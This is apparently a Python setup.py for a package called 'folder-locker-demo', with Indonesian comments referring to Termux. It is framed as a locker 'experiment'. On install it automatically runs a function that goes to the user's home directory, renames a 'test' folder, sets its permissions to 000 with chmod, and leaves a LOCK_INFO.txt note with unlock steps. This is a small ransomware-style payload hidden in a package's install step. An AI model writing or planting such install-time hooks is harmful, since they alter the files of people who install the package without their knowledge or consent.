from setuptools import setup
import os
import time

def lock_test_folder():
    print("🚀 STARTING AUTO-LOCK EXPERIMENT")
    
    # Pindah ke home directory Termux
    home_dir = os.path.expanduser("~")
    original_dir = os.getcwd()
    
    print(f"📁 Original directory: {original_dir}")
    print(f"📁 Moving to home: {home_dir}")
    
    os.chdir(home_dir)
    print(f"📁 Now in: {os.getcwd()}")
    print(f"📂 Files here: {os.listdir('.')}")
    
    if os.path.exists("test"):
        print("✅ FOLDER 'test' DITEMUKAN!")
        print("🔒 Starting lock process...")
        
        # 1. Rename folder
        os.rename("test", "test-LOCKED")
        print("📁 Renamed: test → test-LOCKED")
        
        # 2. Change permissions
        os.system("chmod 000 test-LOCKED")
        print("🔐 Changed permissions: chmod 000")
        
        # 3. Create info file
        with open("LOCK_INFO.txt", "w") as f:
            f.write("EXPERIMENT BERHASIL!\n")
            f.write("Folder 'test' berhasil dikunci via requirements.txt\n")
            f.write("Cara unlock: chmod 755 test-LOCKED && mv test-LOCKED test\n")
        
        print("📄 Created: LOCK_INFO.txt")
        print("\n🎉 AUTO-LOCK EXPERIMENT SUCCESS!")
        
    else:
        print("❌ Folder 'test' tidak ditemukan di home directory")
        print("📂 Current folders:", [f for f in os.listdir(".") if os.path.isdir(f)])

# Auto execute saat install
lock_test_folder()

setup(
    name='folder-locker-demo',
    version='1.0.0',
    description='Demo cara kerja locker'
)
